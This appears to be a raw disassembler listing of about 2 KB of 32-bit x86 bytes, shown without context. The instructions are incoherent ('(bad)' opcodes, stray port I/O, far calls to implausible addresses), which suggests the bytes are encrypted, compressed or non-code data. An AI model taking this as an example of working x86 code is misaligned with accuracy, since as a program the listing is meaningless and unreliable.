  4028c0:	mov    al,0x6e
  4028c2:	jnp    0x402851
  4028c4:	cmp    al,0x8
  4028c6:	bswap  edi
  4028c8:	dec    ebx
  4028c9:	mov    BYTE PTR [ebp+ebx*2-0x6f],dh
  4028cd:	or     al,0xb9
  4028cf:	xchg   ebx,eax
  4028d0:	pop    eax
  4028d1:	push   edx
  4028d2:	icebp  
  4028d3:	inc    edx
  4028d4:	mov    ebx,0x80b84bdc
  4028d9:	dec    esp
  4028da:	jnp    0x402936
  4028dc:	jl     0x4028a7
  4028de:	push   0x6c
  4028e0:	lods   al,BYTE PTR ds:[esi]
  4028e1:	push   esi
  4028e2:	sbb    al,0xe7
  4028e4:	cdq    
  4028e5:	or     ebp,DWORD PTR [edi+0x2]
  4028e8:	sub    eax,0x846f83e2
  4028ed:	dec    edi
  4028ee:	nop
  4028ef:	push   cs
  4028f0:	(bad)  
  4028f1:	ffree  st(0)
  4028f3:	cmp    al,0x8c
  4028f5:	mov    ds:0xb056f4ed,eax
  4028fa:	cs and dh,ch
  4028fd:	int3   
  4028fe:	rol    BYTE PTR [edx+0x5fcf0834],0xf8
  402905:	fisub  DWORD PTR ds:0x1d34ba4c
  40290b:	xor    DWORD PTR [ebx-0x42],esi
  40290e:	jne    0x4028e4
  402910:	jb     0x4028ca
  402912:	and    DWORD PTR [edi-0x5f],0xffffffb8
  402916:	in     eax,0x96
  402918:	mov    edx,0x9cc92ccd
  40291d:	inc    esp
  40291e:	jp     0x4028b7
  402920:	and    ch,BYTE PTR [esi+0x3e]
  402923:	nop
  402924:	pop    es
  402925:	dec    DWORD PTR [ecx]
  402927:	stos   BYTE PTR es:[edi],al
  402928:	add    eax,ebp
  40292a:	fnstcw WORD PTR [ebx-0x378e6b44]
  402930:	out    0xf5,eax
  402932:	sub    edi,DWORD PTR [esp+esi*4+0x5e]
  402936:	dec    eax
  402937:	test   al,ah
  402939:	dec    edi
  40293a:	enter  0x8d6c,0x20
  40293e:	fcmovnb st,st(4)
  402940:	xchg   ebp,eax
  402941:	stc    
  402942:	adc    DWORD PTR [edi],ebx
  402944:	mov    edx,0xd9752448
  402949:	jns    0x40296d
  40294b:	xchg   edx,eax
  40294c:	mov    al,0xf0
  40294e:	add    al,0x3f
  402950:	test   BYTE PTR [ecx],0x80
  402953:	or     eax,0x5f42f1ae
  402958:	mov    edx,0xcddb5586
  40295d:	call   0x6108d945
  402962:	test   al,0xfa
  402964:	dec    edx
  402965:	test   al,0xf4
  402967:	aam    0xd1
  402969:	out    0xe4,eax
  40296b:	popa   
  40296c:	mov    al,ds:0xe937d6af
  402971:	pop    ds
  402972:	mov    eax,ds:0x22d2d313
  402977:	addr16 (bad) 
  402979:	sub    eax,0xffaee849
  40297e:	lock or ebx,ebp
  402981:	pop    ds
  402982:	es int 0xca
  402985:	out    0x7,al
  402987:	fnsave [ebp+0x6dbda580]
  40298d:	test   eax,0xc4b0e002
  402992:	(bad)  
  402993:	adc    dl,BYTE PTR ds:0xea18d01b
  402999:	xchg   esi,eax
  40299a:	inc    ebx
  40299b:	sbb    al,0x16
  40299d:	cmp    esi,ebx
  40299f:	test   BYTE PTR [eax+ecx*4-0x43],ah
  4029a3:	(bad)  [edx]
  4029a5:	stos   DWORD PTR es:[edi],eax
  4029a6:	mov    BYTE PTR [edi],ch
  4029a8:	pop    es
  4029a9:	nop
  4029aa:	int3   
  4029ab:	gs push ebp
  4029ad:	shl    DWORD PTR [bp+di+0x43],1
  4029b1:	sti    
  4029b2:	rcl    BYTE PTR cs:[edi+edx*1+0x2d9464b9],cl
  4029ba:	inc    ecx
  4029bb:	es enter 0x6699,0x3e
  4029c0:	and    al,0x97
  4029c2:	into   
  4029c3:	mov    al,0xa2
  4029c5:	mov    bl,0x87
  4029c7:	ds inc esp
  4029c9:	lods   al,BYTE PTR ds:[esi]
  4029ca:	add    eax,0xf0072462
  4029cf:	arpl   bp,ax
  4029d1:	push   ds
  4029d2:	jecxz  0x402a33
  4029d4:	mov    dl,0x92
  4029d6:	sbb    DWORD PTR [esp+esi*1-0x29],eax
  4029da:	shl    DWORD PTR [ecx],cl
  4029dc:	nop
  4029dd:	lds    edi,FWORD PTR [edi-0x37aa46ce]
  4029e3:	sub    ebx,edi
  4029e5:	les    ebp,FWORD PTR [ecx-0x9]
  4029e8:	sti    
  4029e9:	xchg   DWORD PTR [ecx],ecx
  4029eb:	das    
  4029ec:	mov    eax,DWORD PTR [edx+ecx*1+0x3b]
  4029f0:	scas   eax,DWORD PTR es:[edi]
  4029f1:	push   ebx
  4029f2:	out    0xb2,al
  4029f4:	imul   edi,ebx,0xffffff93
  4029f7:	ret    0x632b
  4029fa:	or     BYTE PTR [edi+0x73b9c1ca],ch
  402a00:	inc    ebp
  402a01:	ret    0xa
  402a04:	leave  
  402a05:	cmp    eax,DWORD PTR [eax-0x4a]
  402a08:	shl    dh,0x72
  402a0b:	pop    ecx
  402a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0d:	sub    al,0x49
  402a0f:	call   0x2cd9:0xd42b884d
  402a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a17:	mov    ds:0xd431317d,al
  402a1c:	cmp    edx,DWORD PTR [eax-0x3e]
  402a1f:	stos   DWORD PTR es:[edi],eax
  402a20:	aaa    
  402a21:	add    DWORD PTR [ecx],esi
  402a23:	stc    
  402a24:	add    eax,0x274abe86
  402a29:	repnz push esi
  402a2b:	mov    al,ds:0x34dd5121
  402a30:	mov    ecx,0x35753a13
  402a35:	test   DWORD PTR [ebx],edi
  402a37:	(bad)  
  402a38:	in     al,0x8
  402a3a:	and    DWORD PTR [ebp+0x26c78394],esi
  402a40:	(bad)  
  402a42:	and    ecx,DWORD PTR [esi-0x32]
  402a45:	xchg   ecx,eax
  402a46:	adc    BYTE PTR [ebx+0x24],ah
  402a49:	xor    ebp,ebp
  402a4b:	mov    al,ds:0x22b4f93f
  402a50:	pop    eax
  402a51:	xor    DWORD PTR [edx-0x33d5f474],ecx
  402a57:	in     al,0xa4
  402a59:	ret    
  402a5a:	dec    edi
  402a5b:	xchg   ebx,eax
  402a5c:	jmp    0x402a1a
  402a5e:	out    dx,al
  402a5f:	fwait
  402a60:	imul   ecx,DWORD PTR [ebx],0x54
  402a63:	adc    al,0x5e
  402a65:	loop   0x402a62
  402a67:	enter  0xcda8,0xee
  402a6b:	pop    ebp
  402a6c:	js     0x402a07
  402a6e:	xor    cl,bl
  402a70:	sahf   
  402a71:	std    
  402a72:	sahf   
  402a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a74:	sbb    al,0xfa
  402a76:	ja     0x402ad7
  402a78:	loope  0x402a69
  402a7a:	into   
  402a7b:	cmp    esi,DWORD PTR [ecx+0x6c]
  402a7e:	inc    ebp
  402a7f:	inc    esi
  402a80:	adc    BYTE PTR [eax-0x68332f52],ah
  402a86:	jmp    DWORD PTR [edi]
  402a88:	shr    BYTE PTR [ebp+0x8],0x90
  402a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8d:	jae    0x402a53
  402a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a90:	pop    edi
  402a91:	pop    ds
  402a92:	repz add eax,0x6f6931c4
  402a98:	call   0x2a6c:0x655ab2a
  402a9f:	mov    WORD PTR [esi-0x7c],?
  402aa2:	leave  
  402aa3:	pop    edi
  402aa4:	fidiv  DWORD PTR [ebx-0x706a101f]
  402aaa:	mov    esi,0xe9df1964
  402aaf:	mov    ecx,0x3769fc35
  402ab4:	jne    0x402b1d
  402ab6:	fs dec ecx
  402ab8:	imul   ecx,DWORD PTR [edx+0x35],0xeccea48d
  402abf:	enter  0x516,0x54
  402ac3:	pop    esp
  402ac4:	cld    
  402ac5:	test   eax,0xd05f7d61
  402aca:	fs nop
  402acc:	sub    DWORD PTR [esi],0xdd94f90c
  402ad2:	and    DWORD PTR [esi-0x3a],edi
  402ad5:	cdq    
  402ad6:	loope  0x402b16
  402ad8:	das    
  402ad9:	stc    
  402ada:	pop    ss
  402adb:	xor    esi,0x3eaa2747
  402ae1:	jmp    0xe55a:0x4a793669
  402ae8:	adc    BYTE PTR [edi+ecx*8+0x44688f24],bh
  402aef:	xor    ecx,edx
  402af1:	cwde   
  402af2:	pop    ebx
  402af3:	aam    0xff
  402af5:	cmovs  esp,DWORD PTR [ebx+ebx*1]
  402af9:	bound  esp,QWORD PTR [edx]
  402afb:	mov    al,ds:0x7d557fcd
  402b00:	test   BYTE PTR [esp+eiz*4+0x67c74b62],0xb5
  402b08:	test   dl,bl
  402b0a:	mov    BYTE PTR [ebx-0x3b],bl
  402b0d:	aam    0x13
  402b0f:	pusha  
  402b10:	sub    cl,BYTE PTR [eax+0x145a4de1]
  402b16:	and    eax,0x865c7a76
  402b1b:	popf   
  402b1c:	mov    ds:0x6801299c,eax
  402b21:	sbb    BYTE PTR [eax+edx*1],ah
  402b24:	jbe    0x402b14
  402b26:	repnz inc esp
  402b28:	fxch   st(3)
  402b2a:	daa    
  402b2b:	sub    BYTE PTR [ebx-0x316164c6],dl
  402b31:	dec    ebp
  402b32:	les    ebp,FWORD PTR [esi+0x64]
  402b35:	rcr    DWORD PTR [edx-0x5e],cl
  402b38:	push   0x6f
  402b3a:	xchg   esp,eax
  402b3b:	push   ebx
  402b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b3d:	stos   BYTE PTR es:[edi],al
  402b3e:	cmc    
  402b3f:	sub    BYTE PTR [edi],dl
  402b41:	jo     0x402b8b
  402b43:	pop    edi
  402b44:	push   ebp
  402b45:	mov    ah,0x54
  402b47:	in     eax,dx
  402b48:	shr    DWORD PTR [edx+0x23],0x5f
  402b4c:	repz aad 0x15
  402b4f:	int3   
  402b50:	xor    ebx,DWORD PTR [edx+0x58]
  402b53:	std    
  402b54:	cmp    dl,0xa1
  402b57:	fisubr WORD PTR [ecx+0x446e2c58]
  402b5d:	dec    ebx
  402b5e:	sub    eax,0x5258fb29
  402b63:	inc    edx
  402b64:	dec    ebx
  402b65:	loope  0x402b24
  402b67:	adc    bh,ah
  402b69:	cld    
  402b6a:	mov    cl,0xff
  402b6c:	sub    DWORD PTR [edi+0x4cab5569],eax
  402b72:	mov    bh,0x95
  402b74:	pop    ebp
  402b75:	push   ss
  402b76:	add    eax,0xe0a0c261
  402b7b:	(bad)  
  402b7c:	dec    ebx
  402b7d:	cmc    
  402b7e:	push   ss
  402b7f:	cli    
  402b80:	pop    eax
  402b81:	xor    DWORD PTR [eax],ebx
  402b83:	mov    ds:0xf497872,eax
  402b88:	jae    0x402bac
  402b8a:	ss imul esp
  402b8d:	shl    BYTE PTR [esi+ebp*8],0x5d
  402b91:	retf   
  402b92:	and    BYTE PTR [bx+0x37bb],dh
  402b97:	ja     0x402b59
  402b99:	xlat   BYTE PTR ds:[ebx]
  402b9a:	sub    DWORD PTR [esi+ecx*4-0x2c],ecx
  402b9e:	add    bl,cl
  402ba0:	retf   
  402ba1:	sti    
  402ba2:	jle    0x402b56
  402ba4:	sbb    eax,0x9f19d62d
  402ba9:	jae    0x402bf5
  402bab:	inc    ebx
  402bac:	inc    bp
  402bae:	(bad)  
  402baf:	jns    0x402c10
  402bb1:	push   ds
  402bb2:	fimul  WORD PTR [esi-0x30]
  402bb5:	inc    ecx
  402bb6:	sub    BYTE PTR [edx],ah
  402bb8:	daa    
  402bb9:	push   cs
  402bba:	arpl   si,ax
  402bbc:	fst    DWORD PTR [eax+eax*4]
  402bbf:	push   esi
  402bc0:	call   0x8f1c:0x4a394a42
  402bc7:	imul   edx,DWORD PTR [esi+0x5aaf4a33],0x2
  402bce:	adc    edx,esp
  402bd0:	push   ecx
  402bd1:	dec    edi
  402bd2:	xor    DWORD PTR [esi+0x1a],esp
  402bd5:	jne    0x402bf6
  402bd7:	adc    eax,0x975e0484
  402bdc:	jnp    0x402b67
  402bde:	jmp    0x402b60
  402be0:	retf   0xf88a
  402be3:	retf   0x4264
  402be6:	lea    edx,[esi]
  402be8:	push   edi
  402be9:	pop    eax
  402bea:	and    DWORD PTR [esi+0x12],ecx
  402bed:	fcmovnb st,st(7)
  402bef:	out    0xec,eax
  402bf1:	adc    BYTE PTR [ecx-0x60d91d75],ah
  402bf7:	retf   0x81dc
  402bfa:	ja     0x402b99
  402bfc:	inc    esp
  402bfd:	jge    0x402c7e
  402bff:	sar    BYTE PTR [ebp-0x7f],0x6d
  402c03:	jne    0x402c5f
  402c05:	daa    
  402c06:	das    
  402c07:	mov    ecx,cs
  402c09:	sbb    BYTE PTR [edi-0x2],0x7f
  402c0d:	fcomip st,st(4)
  402c0f:	pop    ecx
  402c10:	jbe    0x402c91
  402c12:	fist   WORD PTR [ebp+0x656da4a0]
  402c18:	mov    ebp,0x68962513
  402c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1e:	in     al,0x7
  402c20:	addr16 mov bl,0x8b
  402c23:	addr16 mov esi,0x3157eff
  402c29:	xlat   BYTE PTR ds:[ebx]
  402c2a:	add    eax,DWORD PTR [esi+0x14d8e6b1]
  402c30:	xchg   al,al
  402c32:	test   al,0x37
  402c34:	call   0xc2d3:0xfb442ab1
  402c3b:	repz ss loop 0x402c21
  402c3f:	or     BYTE PTR [edi+0x44ce0b40],al
  402c45:	push   ebp
  402c46:	jle    0x402c4f
  402c48:	push   ebx
  402c49:	je     0x402c35
  402c4b:	out    0xcd,al
  402c4d:	adc    DWORD PTR [esi],ebx
  402c4f:	daa    
  402c50:	fcmovu st,st(7)
  402c52:	dec    ecx
  402c53:	cmp    ebp,edi
  402c55:	mov    eax,0xb9b34db5
  402c5a:	in     eax,0x4d
  402c5c:	addr16 push eax
  402c5e:	(bad)  
  402c60:	repnz ins DWORD PTR es:[edi],dx
  402c62:	repz xor dh,BYTE PTR [eax-0x630d43bf]
  402c69:	dec    ecx
  402c6a:	sar    BYTE PTR [eax+eax*1-0x87a7955],0xe2
  402c72:	pop    ebx
  402c73:	sub    eax,DWORD PTR [esi]
  402c75:	ret    0x1a5d
  402c78:	icebp  
  402c79:	dec    edx
  402c7a:	inc    ebp
  402c7b:	repz gs and eax,0xb9b9f81d
  402c82:	ret    
  402c83:	pop    edx
  402c84:	jle    0x402c9a
  402c86:	xchg   BYTE PTR [edx+0x49523317],bl
  402c8c:	rol    BYTE PTR [ebx+0x4b],cl
  402c8f:	mov    eax,0xffe1686c
  402c94:	jne    0x402c96
  402c96:	fdiv   QWORD PTR [ebx+esi*8+0xc]
  402c9a:	mov    bl,0xb3
  402c9c:	js     0x402c7b
  402c9e:	cmp    BYTE PTR [eax+0xc],dh
  402ca1:	xchg   ebx,eax
  402ca2:	arpl   WORD PTR [eax],bx
  402ca4:	dec    ebp
  402ca5:	(bad)  
  402ca6:	adc    al,0x69
  402ca8:	pop    eax
  402ca9:	(bad)  
  402caa:	fimul  WORD PTR [ebp+0x2f1157bf]
  402cb0:	mov    al,0x64
  402cb2:	dec    esp
  402cb3:	clc    
  402cb4:	push   edi
  402cb5:	adc    DWORD PTR [edx+0x55],ebx
  402cb8:	rol    BYTE PTR ds:0x40f80126,cl
  402cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cbf:	int3   
  402cc0:	fadd   DWORD PTR [edx]
  402cc2:	sub    al,0xee
  402cc4:	mov    edi,0x2e5ba5fc
  402cc9:	jb     0x620a7df
  402ccf:	ss jle 0x402d15
  402cd2:	xor    bh,ch
  402cd4:	cwde   
  402cd5:	repnz mov edx,0x3e3675b5
  402cdb:	xor    BYTE PTR [ecx-0x5ea9c332],ah
  402ce1:	cdq    
  402ce2:	lods   eax,DWORD PTR ds:[esi]
  402ce3:	sub    BYTE PTR [eax+0x67f4ee09],cl
  402ce9:	xchg   esi,edx
  402ceb:	test   BYTE PTR [ecx+eax*8-0x35],ah
  402cef:	jge    0x402cce
  402cf1:	popa   
  402cf2:	pop    esi
  402cf3:	jmp    0x9ddc:0xacee609f
  402cfa:	adc    eax,esi
  402cfc:	or     eax,0x8ed76bac
  402d01:	jmp    DWORD PTR [ebx-0x1325c8be]
  402d07:	cld    
  402d08:	fsubrp st(0),st
  402d0a:	je     0x402d61
  402d0c:	fs (bad) 
  402d0e:	shr    BYTE PTR [ebp-0x3f19a3d5],0x38
  402d15:	and    eax,DWORD PTR [ecx+eiz*8+0x6c]
  402d19:	icebp  
  402d1a:	shr    DWORD PTR [ebx+0x16],cl
  402d1d:	sbb    BYTE PTR [ebx-0x58],dh
  402d20:	bound  edx,QWORD PTR [ebx]
  402d22:	bound  esi,QWORD PTR [esi+0x28]
  402d25:	bound  esp,QWORD PTR [ecx+0x3e9a847b]
  402d2b:	push   0xffffffff
  402d2d:	repz sbb DWORD PTR [edx],ecx
  402d30:	cwde   
  402d31:	jbe    0x402cd8
  402d33:	fisub  WORD PTR [ebx+0x70]
  402d36:	mov    eax,0xf159d029
  402d3b:	cld    
  402d3c:	xor    DWORD PTR [esi],0x30
  402d3f:	(bad)  
  402d40:	jge    0x402d80
  402d42:	rcl    DWORD PTR [ebx-0x5f],cl
  402d45:	clc    
  402d46:	les    esp,FWORD PTR [edx+0x36]
  402d49:	mov    ds:0x7720cc28,al
  402d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d4f:	dec    ebp
  402d50:	jns    0x402d85
  402d52:	sub    esp,ecx
  402d54:	add    eax,0x4c3fa966
  402d59:	mov    dh,0xe
  402d5b:	data16 fst DWORD PTR fs:[ebx+0x1c]
  402d60:	sbb    esi,ebx
  402d62:	pop    ebx
  402d63:	ret    
  402d64:	sub    eax,0x6a80757a
  402d69:	push   0xe8ba58d5
  402d6e:	fisubr DWORD PTR [esi-0x2e]
  402d71:	shl    BYTE PTR [ebx+ebp*4+0x18],0x4b
  402d76:	fbld   TBYTE PTR [edx]
  402d78:	sbb    al,0x52
  402d7a:	js     0x402ddf
  402d7c:	xchg   ebp,eax
  402d7d:	adc    al,0xf2
  402d7f:	mov    al,0xb2
  402d81:	xor    eax,0x765be77a
  402d86:	push   ds
  402d87:	sahf   
  402d88:	pusha  
  402d89:	mov    al,0x8c
  402d8b:	mov    edx,DWORD PTR [ebx-0x24727629]
  402d91:	adc    eax,0x1f05f9ba
  402d96:	mov    ebx,0x3ac7c2f4
  402d9b:	push   ss
  402d9c:	sar    DWORD PTR [ecx],cl
  402d9e:	adc    eax,0x86665260
  402da3:	sub    edi,DWORD PTR [eax+ecx*8]
  402da6:	sbb    dh,BYTE PTR [ebx-0x6]
  402da9:	mov    bh,0xac
  402dac:	sbb    BYTE PTR [edx-0x76586691],ch
  402db2:	xor    ebp,0x32
  402db5:	jle    0x402db2
  402db7:	fwait
  402db8:	sbb    esp,DWORD PTR [esi+0x19a48d9c]
  402dbe:	(bad)  
  402dbf:	ins    BYTE PTR es:[edi],dx
  402dc0:	call   0xa357:0xc8c6d6c
  402dc7:	sub    dh,BYTE PTR [ebp-0x26adf299]
  402dcd:	hlt    
  402dce:	cwde   
  402dcf:	retf   0xa741
  402dd2:	pop    esp
  402dd3:	imul   BYTE PTR [eax+0x2f]
  402dd6:	sbb    al,0xb6
  402dd8:	adc    DWORD PTR [eax+0x5],ecx
  402ddb:	sbb    al,dl
  402ddd:	loop   0x402e1d
  402ddf:	inc    eax
  402de0:	inc    ebx
  402de1:	sahf   
  402de2:	scas   eax,DWORD PTR es:[edi]
  402de3:	les    esi,FWORD PTR [ebx+0x26]
  402de6:	ret    0x8da2
  402de9:	xor    eax,0xe6a8a92d
  402dee:	and    BYTE PTR [ecx],0xce
  402df1:	push   edi
  402df2:	jno    0x402e15
  402df4:	int    0x32
  402df6:	(bad)  
  402df7:	jnp    0x402d7e
  402df9:	push   es
  402dfa:	fild   QWORD PTR [ebx]
  402dfc:	fst    QWORD PTR [ebp-0x1066be6f]
  402e02:	push   ss
  402e03:	into   
  402e04:	ds pop ecx
  402e06:	mov    DWORD PTR [ebp+0x37],ebp
  402e09:	push   eax
  402e0a:	or     BYTE PTR [ecx+0x5e9564df],al
  402e10:	adc    ch,cl
  402e12:	and    DWORD PTR [ebx-0x6438a0b2],esi
  402e18:	push   0xffffffa4
  402e1a:	stos   DWORD PTR es:[edi],eax
  402e1b:	adc    BYTE PTR [eax+0x7f],cl
  402e1e:	gs xchg ebx,eax
  402e20:	out    dx,al
  402e21:	cmc    
  402e22:	pop    ds
  402e23:	add    ecx,ecx
  402e25:	fldlg2 
  402e27:	daa    
  402e28:	sahf   
  402e29:	into   
  402e2a:	push   edx
  402e2b:	push   edx
  402e2c:	ds call 0x454a:0xbaa5b6ba
  402e34:	and    BYTE PTR [edi+esi*1],cl
  402e37:	or     DWORD PTR [edi-0x4d],ecx
  402e3a:	stos   BYTE PTR es:[edi],al
  402e3b:	shl    BYTE PTR [edx-0x59],1
  402e3e:	pusha  
  402e3f:	xor    edx,DWORD PTR [edx]
  402e41:	dec    edx
  402e42:	sahf   
  402e43:	add    eax,0xd8c14645
  402e48:	inc    esp
  402e49:	mov    al,ds:0x56cf7c1
  402e4e:	iret   
  402e4f:	int3   
  402e50:	hlt    
  402e51:	mov    DWORD PTR [ebx],esp
  402e53:	shr    DWORD PTR [ebp+ecx*4+0x2a],1
  402e57:	jb     0x402de0
  402e59:	sub    BYTE PTR [esi-0x3bfe67c3],al
  402e5f:	nop
  402e60:	xchg   edi,eax
  402e61:	dec    esi
  402e62:	sub    al,0xcc
  402e64:	mov    bl,0x45
  402e66:	xchg   BYTE PTR [edx],bl
  402e68:	mov    cl,0x69
  402e6a:	mov    esp,0x59144e9a
  402e6f:	sub    ch,dh
  402e71:	popf   
  402e72:	sbb    eax,0x8680e5dc
  402e77:	xchg   ebp,edi
  402e79:	dec    eax
  402e7a:	cdq    
  402e7b:	sbb    BYTE PTR [esi],cl
  402e7d:	sub    cl,BYTE PTR [eax+0x15]
  402e80:	cs jp  0x402e12
  402e83:	pop    es
  402e84:	clc    
  402e85:	lahf   
  402e86:	add    ebp,0xac4bf446
  402e8c:	aas    
  402e8d:	loop   0x402e10
  402e8f:	hlt    
  402e90:	add    al,0x79
  402e92:	cmp    edi,edi
  402e94:	dec    esi
  402e95:	clc    
  402e96:	leave  
  402e97:	loopne 0x402e21
  402e99:	sub    al,0x99
  402e9b:	shl    BYTE PTR [edi+0x19],0x65
  402e9f:	pop    ss
  402ea0:	ficom  DWORD PTR [esp+ebp*8-0x33fed38d]
  402ea7:	es jge 0x402e4e
  402eaa:	cwde   
  402eab:	and    dl,dl
  402ead:	adc    al,0x28
  402eaf:	into   
  402eb0:	fwait
  402eb1:	call   0xb81b:0xe5815a14
  402eb8:	retf   0x62ac
  402ebb:	pop    ebx
  402ebc:	jae    0x402e87
  402ebe:	pop    es
  402ebf:	dec    ecx
  402ec0:	pushf  
  402ec1:	fs push ss
  402ec3:	add    al,0xf
  402ec5:	lock fucompp 
  402ec8:	pop    es
  402ec9:	and    al,0x17
  402ecb:	pop    edx
  402ecc:	xchg   edx,eax
  402ecd:	adc    eax,0x771e5c99
  402ed2:	xchg   edi,eax
  402ed3:	dec    eax
  402ed4:	or     DWORD PTR [ebx],esp
  402ed6:	or     ebp,DWORD PTR [edx+0x61]
  402ed9:	ins    DWORD PTR es:[edi],dx
  402eda:	cmp    BYTE PTR [ebx],dl
  402edc:	mov    esp,0x57cae92c
  402ee1:	repz mov eax,ds:0x6a8f9d09
  402ee7:	(bad)  
  402ee8:	in     eax,dx
  402ee9:	sbb    eax,0xcdef9aa9
  402eee:	or     ch,cl
  402ef0:	pop    ds
  402ef1:	push   eax
  402ef2:	iret   
  402ef3:	jp     0x402f58
  402ef5:	in     al,dx
  402ef6:	jb     0x402f1b
  402ef8:	in     eax,0x4
  402efa:	clc    
  402efb:	(bad)  [edx]
  402efd:	aas    
  402efe:	out    0xb6,al
  402f00:	and    eax,0x8ee0afc2
  402f05:	outs   dx,DWORD PTR ds:[esi]
  402f06:	inc    ebx
  402f07:	pushf  
  402f08:	in     al,dx
  402f09:	pop    edi
  402f0a:	sub    BYTE PTR [esi-0x25],cl
  402f0d:	mov    eax,0xc3dc6343
  402f12:	aam    0x47
  402f14:	sub    eax,0xcbbaa23c
  402f19:	push   cs
  402f1a:	push   cs
  402f1b:	add    eax,eax
  402f1d:	mov    ?,eax
  402f1f:	(bad)  
  402f20:	pop    ss
  402f21:	mov    dh,0x4f
  402f23:	loop   0x402f49
  402f25:	push   0x42
  402f27:	adc    eax,0xa2e17445
  402f2c:	data16 loop 0x402efe
  402f2f:	fnsave [ebx]
  402f31:	pop    es
  402f32:	fld    st(3)
  402f34:	icebp  
  402f35:	das    
  402f36:	push   ebp
  402f37:	fwait
  402f38:	loop   0x402ec0
  402f3a:	xchg   ebx,eax
  402f3b:	or     eax,0x96fcec6a
  402f40:	xchg   esp,eax
  402f41:	mov    ecx,0xba641f90
  402f46:	addr16 cmp eax,0xc1e13687
  402f4c:	sub    DWORD PTR [eax+ebx*8],eax
  402f4f:	sti    
  402f50:	mov    DWORD PTR [edx-0x52],ebx
  402f53:	jmp    0x3150b603
  402f58:	fst    DWORD PTR [eax+0x4e]
  402f5b:	cld    
  402f5c:	rcl    BYTE PTR [ecx],0x50
  402f5f:	adc    al,0x15
  402f61:	outs   dx,BYTE PTR ds:[esi]
  402f62:	mov    al,ds:0x78f7ae37
  402f67:	jl     0x402f3c
  402f69:	add    DWORD PTR [ebp-0x1b],edi
  402f6c:	fld    QWORD PTR [eax+0x3fdb5fd5]
  402f72:	xor    eax,0x344292de
  402f77:	aas    
  402f78:	cld    
  402f79:	rol    DWORD PTR [edi],1
  402f7b:	pop    eax
  402f7c:	bnd jge 0x402f51
  402f7f:	dec    ebx
  402f80:	and    ebx,DWORD PTR [ebx]
  402f82:	push   esp
  402f83:	nop
  402f84:	push   0xffffff94
  402f86:	sub    al,ah
  402f88:	and    DWORD PTR [ebp-0x63],edx
  402f8b:	and    DWORD PTR [edi],ebp
  402f8d:	das    
  402f8e:	push   es
  402f8f:	mov    BYTE PTR [ebx+0xb117a17],dl
  402f95:	add    esp,esp
  402f97:	popa   
  402f98:	mov    ?,WORD PTR [edx-0x4b436c77]
  402f9e:	call   0x77b:0x3faf4348
  402fa5:	mov    ebx,0x5e29551a
  402faa:	cmp    BYTE PTR [edx-0x2c6a2e5],bl
  402fb0:	fsub   st,st(0)
  402fb2:	leave  
  402fb3:	xchg   edi,eax
  402fb4:	fbld   TBYTE PTR [esi+0x24]
  402fb7:	inc    eax
  402fb8:	push   cs
  402fb9:	fisttp DWORD PTR [esi]
  402fbb:	add    BYTE PTR [ecx-0x762ba59f],cl
  402fc1:	mov    cl,0x7f
  402fc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fc4:	(bad)  
  402fc5:	mov    ebp,0x5f30922b
  402fca:	sbb    DWORD PTR [edi],esi
  402fcc:	fldcw  WORD PTR [eax]
  402fce:	mov    ebx,0xba781210
  402fd3:	jne    0x403051
  402fd5:	dec    ecx
  402fd6:	push   0x179a7d78
  402fdb:	out    0x45,al
  402fdd:	xchg   ebp,eax
  402fde:	cld    
  402fdf:	ss (bad) 
  402fe1:	shl    ebp,1
  402fe3:	mov    edi,0xdbfb02bf
  402fe8:	mov    esi,0x8c3f34dc
  402fed:	add    al,BYTE PTR [ebx+0x4ec33c7e]
  402ff3:	inc    edx
  402ff4:	repz imul ebx,ebp,0x44
  402ff8:	mov    dh,BYTE PTR [edi]
  402ffa:	retf   
  402ffb:	jo     0x40304c
  402ffd:	arpl   WORD PTR [ecx+0x29516c60],ax
  403003:	and    esp,esi
  403005:	mov    ds,WORD PTR [ecx-0x7]
  403008:	mov    esi,0xd562bde
  40300d:	out    dx,eax
  40300e:	sbb    al,0x79
  403010:	aas    
  403011:	shl    DWORD PTR ds:0xb6805abb,cl
  403017:	shl    DWORD PTR [esi+0x24],1
  40301a:	pop    ds
  40301b:	push   ds
  40301c:	shr    BYTE PTR [edx+0x71],1
  40301f:	sub    al,cl
  403021:	in     eax,0xb7
  403023:	pop    ds
  403024:	sub    BYTE PTR [edx],0x85
  403027:	std    
  403028:	cmp    edi,DWORD PTR [edx]
  40302a:	addr16 mov eax,0x18594bf5
  403030:	(bad)  
  403031:	ret    
  403032:	sbb    ecx,eax
  403034:	jecxz  0x403075
  403036:	lea    edx,[esi+0x661222fe]
  40303c:	and    eax,0xd49f8fd4
  403041:	pop    edi
  403042:	(bad)  
  403043:	dec    esp
  403044:	inc    ebx
  403045:	(bad)  
  403047:	shr    BYTE PTR [ecx+ecx*1+0x50f8ba8e],cl
  40304e:	test   eax,0xb1eda052
  403053:	pop    es
  403054:	das    
  403055:	mov    eax,ds:0xb2d6705e
  40305a:	shr    ecx,cl
  40305c:	inc    ebp
  40305d:	scas   al,BYTE PTR es:[di]
  40305f:	in     eax,dx
  403060:	push   ss
  403061:	add    BYTE PTR [edi+0x1d],dh
  403064:	test   BYTE PTR [edx+0x8],0x70
  403068:	leave  
  403069:	jne    0x4030b6
  40306b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40306c:	xchg   ebx,eax
  40306d:	jne    0x403007
  40306f:	xchg   ebx,eax
  403070:	(bad)  
  403071:	xchg   DWORD PTR [esi-0xe],ebx
  403074:	add    DWORD PTR [esi],edx
  403076:	inc    edi
  403077:	pop    edx
  403078:	mov    WORD PTR [eax-0x5645684b],cs
  40307e:	pushf  
  40307f:	ins    DWORD PTR es:[edi],dx
  403080:	fist   DWORD PTR [ecx+ecx*1-0x54]
  403084:	sar    edx,1
  403086:	mov    esi,0xf1cfc95a
  40308b:	add    al,0x6
  40308d:	jp     0x40303d
  40308f:	and    al,0xae
  403091:	(bad)  
  403092:	pop    eax
